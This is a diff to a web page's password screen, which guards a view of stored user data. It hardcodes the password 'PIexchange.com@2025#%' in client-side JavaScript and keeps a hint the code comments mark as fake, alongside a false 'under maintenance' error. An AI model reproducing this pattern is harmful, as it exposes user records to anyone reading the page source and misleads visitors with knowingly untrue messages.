@@ -103,7 +103,7 @@
     <div class="container" id="passwordPage" style="display: none;">
         <h2>Enter Password to Access Database</h2>
         <input type="password" id="password" placeholder="Enter Password">
-        <p><strong>Hint:</strong> Your username is your password.</p>
+        <p><strong>Hint:</strong> Your username is your password.</p>  <!-- Fake hint -->
         <button onclick="checkPassword()">Submit</button>
         <p id="errorMessage" class="error-message">Oops! The server is currently under maintenance. Please try again later.</p>
     </div>
@@ -156,9 +156,9 @@
 
         function checkPassword() {
             let password = document.getElementById("password").value.trim();
-            let username = usersData[usersData.length - 1]?.username;
+            let correctPassword = "PIexchange.com@2025#%";
 
-            if (password === username) {
+            if (password === correctPassword) {
                 document.getElementById("passwordPage").style.display = "none";
                 document.getElementById("databasePage").style.display = "block";
                 displayUserData();
